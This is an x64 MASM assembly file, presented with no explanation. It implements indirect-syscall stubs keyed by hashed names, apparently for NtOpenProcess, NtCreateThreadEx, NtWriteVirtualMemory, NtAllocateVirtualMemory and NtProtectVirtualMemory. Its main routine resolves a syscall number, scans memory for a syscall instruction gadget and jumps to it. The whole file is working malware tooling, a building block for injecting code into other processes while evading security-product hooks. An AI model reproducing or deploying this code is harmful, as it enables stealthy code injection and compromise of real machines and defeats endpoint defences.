.data
CRACK_H DWORD 0

.code
EXTERN CRACK_SNumber: PROC
EXTERN CRACK_Get_Base_N: PROC

CRACK_Main PROC
    pop rax
    mov [rsp+ 8], rcx              
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    call CRACK_Get_Base_N
    xor r11, r11
    xor r12, r12
    xor r15, r15
    mov r11, rax
    mov r12, 0FC32ECDC3050F03h
    jmp findjmpinstr
    findjmpinstr:
    add r11, 01h           
    mov r15, [r11]
    cmp r15, r12
    jne findjmpinstr
    add r11, 01h
    mov r12, r11
    nop
    nop
    mov ecx, CRACK_H
    call CRACK_SNumber
    nop
    nop
    add rsp, 28h
    mov rcx, [rsp+ 8]             
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    jmp r12 
    ret
CRACK_Main ENDP

CRACK_NtOP PROC
    mov CRACK_H, 0CD51CCC4h    
    call CRACK_Main              
CRACK_NtOP ENDP

CRACK_NtCTE PROC
    mov CRACK_H, 090B9DE7Eh    
    call CRACK_Main              
CRACK_NtCTE ENDP

CRACK_NtWVM PROC
    mov CRACK_H, 0C553CDC3h    
    call CRACK_Main              
CRACK_NtWVM ENDP

CRACK_NtAVM PROC
    mov CRACK_H, 0B2349C94h    
    call CRACK_Main               
CRACK_NtAVM ENDP

CRACK_NtPVM PROC
    mov CRACK_H, 0CB5CF11Fh    
    call CRACK_Main               
CRACK_NtPVM ENDP

end